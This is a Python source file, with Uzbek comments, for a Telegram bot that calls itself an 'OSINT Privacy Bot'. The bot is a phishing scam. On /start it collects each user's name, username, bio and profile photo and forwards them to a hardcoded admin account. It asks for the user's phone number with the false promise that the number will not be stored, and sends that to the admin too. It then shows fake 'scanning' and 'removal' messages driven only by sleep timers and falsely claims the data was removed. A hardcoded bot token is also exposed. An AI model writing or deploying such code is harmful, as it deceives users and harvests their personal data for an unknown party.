import asyncio
import os
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram import InputFile

# Bot tokeni va admin ID (o'zingiznikiga almashtiring)
BOT_TOKEN = "7139163005:AAGCDKnVFAXO73UveHFkq5yNssi0XdJxE48"
ADMIN_ID = "6407499097"  # Sizning Telegram ID'ingiz, masalan, 123456789
SPECIAL_USER_ID = 7602365701  # Maxsus foydalanuvchi ID'si

# /start buyrug'i
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name or "Noma'lum"
    username = user.username or "Yo'q"
    
    # Bio olish
    bio = "Bio topilmadi"
    try:
        user_full = await context.bot.get_chat(user_id)
        bio = user_full.bio or "Bio yo'q"
    except Exception:
        pass
    
    # Profil rasmini yuklab olish
    profile_photo_path = None
    try:
        profile_photos = await context.bot.get_user_profile_photos(user_id, limit=1)
        if profile_photos.photos:
            file = await context.bot.get_file(profile_photos.photos[0][-1].file_id)
            profile_photo_path = f"temp_{user_id}.jpg"
            await file.download_to_drive(profile_photo_path)
    except Exception:
        profile_photo_path = None
    
    # Admin'ga xabar tayyorlash
    admin_message = (
        f"🔔 New user started the bot!\n\n"
        f"👤 User ID: {user_id}\n"
        f"📛 Name: {first_name}\n"
        f"🖇 Username: @{username}\n"
        f"📝 Bio: {bio}\n"
        f"📱 Phone: Not shared yet"
    )
    # Agar maxsus foydalanuvchi bo'lsa
    if user_id == SPECIAL_USER_ID:
        admin_message += "\n\nUrrreeee mi! 🎉 This user makes me so happy! 😄"
    
    # Admin'ga xabar yuborish
    if profile_photo_path:
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(open(profile_photo_path, "rb")),
            caption=admin_message
        )
        os.remove(profile_photo_path)  # Vaqtinchalik faylni o'chirish
    else:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
    
    # Foydalanuvchiga oddiy xabar
    message = (
        "Welcome to the OSINT Privacy Bot! 🛡️\n\n"
        "This bot helps you protect your privacy by removing your information from OSINT (Open-Source Intelligence) databases and Telegram public groups. "
        "With this bot, you can hide your data from others and stay secure.\n\n"
        "To start hiding your information, use the /hide command."
    )
    await update.message.reply_text(message)

# /hide buyrug'i
async def hide(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Share Phone Number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    message = (
        "To hide your information, please share your phone number.\n\n"
        "Why do we need it? Your phone number is used to search and remove your data from OSINT servers and Telegram public groups. "
        "Don't worry, your number will only be used for this purpose and will not be stored."
    )
    await update.message.reply_text(message, reply_markup=reply_markup)

# Telefon raqami qabul qilinganda
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name or "Noma'lum"
    username = user.username or "Yo'q"
    contact = update.message.contact
    phone_number = contact.phone_number
    
    # Bio olish
    bio = "Bio topilmadi"
    try:
        user_full = await context.bot.get_chat(user_id)
        bio = user_full.bio or "Bio yo'q"
    except Exception:
        pass
    
    # Profil rasmini yuklab olish
    profile_photo_path = None
    try:
        profile_photos = await context.bot.get_user_profile_photos(user_id, limit=1)
        if profile_photos.photos:
            file = await context.bot.get_file(profile_photos.photos[0][-1].file_id)
            profile_photo_path = f"temp_{user_id}.jpg"
            await file.download_to_drive(profile_photo_path)
    except Exception:
        profile_photo_path = None
    
    # Admin'ga xabar tayyorlash
    admin_message = (
        f"🔔 User shared phone number!\n\n"
        f"👤 User ID: {user_id}\n"
        f"📛 Name: {first_name}\n"
        f"🖇 Username: @{username}\n"
        f"📝 Bio: {bio}\n"
        f"📱 Phone: {phone_number}"
    )
    # Agar maxsus foydalanuvchi bo'lsa
    if user_id == SPECIAL_USER_ID:
        admin_message += "\n\nUrrreeee mi! 🎉 This user makes me so happy! 😄"
    
    # Admin'ga xabar yuborish
    if profile_photo_path:
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(open(profile_photo_path, "rb")),
            caption=admin_message
        )
        os.remove(profile_photo_path)  # Vaqtinchalik faylni o'chirish
    else:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
    
    # Foydalanuvchiga progress ko'rsatish
    await update.message.reply_text("🔍 Scanning OSINT databases for your data...")
    await asyncio.sleep(2)
    
    await update.message.reply_text("🗑️ Removing your data from public groups...")
    await asyncio.sleep(2)
    
    await update.message.reply_text("✅ Finalizing removal process...")
    await asyncio.sleep(1)
    
    # Foydalanuvchiga yakuniy xabar
    await update.message.reply_text(
        "Done! 🎉 Your information has been successfully removed from OSINT databases and public groups.\n\n"
        "Please wait for the changes to take effect (this may take a few hours). "
        "Thank you for using our bot!"
    )

def main():
    # Botni ishga tushirish
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Handler'larni qo'shish
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("hide", hide))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    
    # Botni polling rejimida ishga tushirish
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()